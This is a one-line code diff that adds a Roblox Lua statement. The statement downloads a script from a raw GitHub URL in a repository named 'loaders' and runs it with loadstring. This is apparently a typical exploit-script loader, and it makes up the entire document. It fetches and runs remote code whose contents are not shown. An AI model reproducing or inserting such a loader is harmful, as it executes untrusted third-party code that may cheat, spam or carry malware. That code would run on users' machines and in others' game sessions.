@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/apple-ipad-original-spam0-mdz876hfm6f8ag.lua"))()
